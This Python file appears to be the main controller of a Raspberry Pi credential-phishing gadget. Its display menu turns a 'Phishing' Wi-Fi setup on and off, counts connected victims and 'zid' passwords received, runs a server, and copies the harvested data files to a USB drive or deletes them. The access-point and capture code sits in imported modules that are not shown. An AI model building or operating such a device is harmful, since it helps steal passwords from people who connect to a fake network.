import _thread
import time

from hardware import _dig_input, _input
from helper import *
from phase_out_wifi import *
from rgbscreen import *
from server import run_server
from setup_wifi import *
from wifi_connect_detile import *

typ = "2"
loop_typ = 1
mode = 0


def backlight():
    RGB = {
        "R":255,
        "G":0,
        "B":0
    }
    global loop_typ
    keys_lp1 = ["G","B","R"]
    keys_lp2 = ["R","G","B"]
    #make RGB Colour Cycle
    for i in range(0, 3):
        while RGB[keys_lp1[i]] < 255:
            swich_Mode()
            if mode != 0: break
            swich_typ()
            setRGB(RGB["R"],RGB["G"],RGB["B"])
            button_read_and_switch()
            time.sleep(0.001)
            RGB[keys_lp1[i]] += 1
            if RGB[keys_lp1[i]] % 10 == 0:
                settext_screen()

        while RGB[keys_lp2[i]] > 0:
            swich_Mode()
            if mode != 0: break
            swich_typ()
            setRGB(RGB["R"],RGB["G"],RGB["B"])
            button_read_and_switch()
            time.sleep(0.001)
            RGB[keys_lp2[i]] -= 1
            if RGB[keys_lp2[i]] % 10 == 0:
                settext_screen()

def swich_Mode():
    swich_pin = 3
    global mode
    #get input from switch 
    mode = _dig_input(swich_pin)

def settext_screen():
    setText_norefresh(output_wifi_status())

def output_wifi_status():
    global typ
    typ = int(typ)
    if typ == 1:
        #if Phishing is off
        if(get_wifi_status() == 0): return "push button to turn on Phishing"
        return "push button to turn off Phishing"
    if typ == 2: return f"Num connecting {str(get_number_of_connected())}"
    if typ == 3: return "Num zid received " + str(get_number_of_zid_password())
    if typ == 4: return "Get data"
    if typ == 5: return "Clear Acquired Data"
    if typ == 6: return "poweroff ?"
    return"N/O"

def swich_typ():
    button = 2
    global typ
    #Get input from knob and change curr_typ
    read = _input(button)
    rang = 1020/6
    if read < rang:  curr_typ = 1
    elif read < rang*2: curr_typ = 2
    elif read < rang*3: curr_typ = 3
    elif read < rang*4: curr_typ = 4
    elif read < rang*5: curr_typ = 5
    else : curr_typ = 6

    #Enables real-time mode switching without delays
    if int(curr_typ) != int(typ):
        typ = curr_typ
        settext_screen()
    typ = curr_typ

def write_value_to_device():
    succ = 0
    try: 
        #if usbdev Non-existent, create it
        run_command("sudo mkdir /home/pi/usbdev")
    except: 
        pass
    for i in ["a","b","c"]:
        try:
            #mount usb device
            msg = run_command_with_error_message(f"sudo mount -o rw /dev/sd{i}1 /home/pi/usbdev")

            #if mount success, write data to device
            if(msg[0] == 0 or (msg[0] != 0 and msg[1].find("already mounted") == -1)):
                run_command("sudo cp /home/pi/data.txt /home/pi/usbdev/")
                run_command("sudo cp /home/pi/data.json /home/pi/usbdev/")
                #eject usb device
                run_command("sudo umount /home/pi/usbdev")
                succ = 1;
        except:
            pass
        if(succ == 1): break

    if succ == 0: return "no device"
    return "success"

def button_read_and_switch():
    button = 4
    #get input from button
    read = _dig_input(button)
    if(read == 1 and typ == 4):
        setText_norefresh("writing")
        setText_norefresh(write_value_to_device())
        time.sleep(0.5)
    elif(read == 1 and typ == 1 and get_wifi_status() == 1):
        setText_norefresh("turn off Phishing....")
        phase_out_wifi()
    elif(read == 1 and typ == 1 and get_wifi_status() == 0):
        setText_norefresh("turn on Phishing....")
        setup_wifi()
    elif(read == 1 and typ == 5):   
        setText_norefresh("clearing")
        try:
            run_command("sudo rm /home/pi/data.txt")
            run_command("sudo rm /home/pi/data.json")
            setText_norefresh("success")
            time.sleep(0.5)
        except:
            setText_norefresh("error, no data")
            time.sleep(0.5)
    elif(read == 1 and typ == 6):
        setText_norefresh("poweroff")
        setRGB(0,0,0)
        #To prevent the raspberry pi from sending the signal and shutting down 
        #before it reaches the grovepi, so do a 0.5 second delay to ensure 
        #that the grovepi has received the signal.
        time.sleep(0.5)
        run_command("sudo poweroff")




def run_forend():
    while 1: 
        if mode == 0:
            backlight()
            swich_Mode()
        else:
            setRGB(0,0,0)
            setText_norefresh("By By")
            swich_Mode()
            time.sleep(1)

if __name__ == "__main__":
    wifi_if_open = get_wifi_status()
    if wifi_if_open == 0:
        run_forend()
    else:
        _thread.start_new_thread(run_forend, ())
        try:
            run_server()
        except:
            pass

# while 1:
#    pass
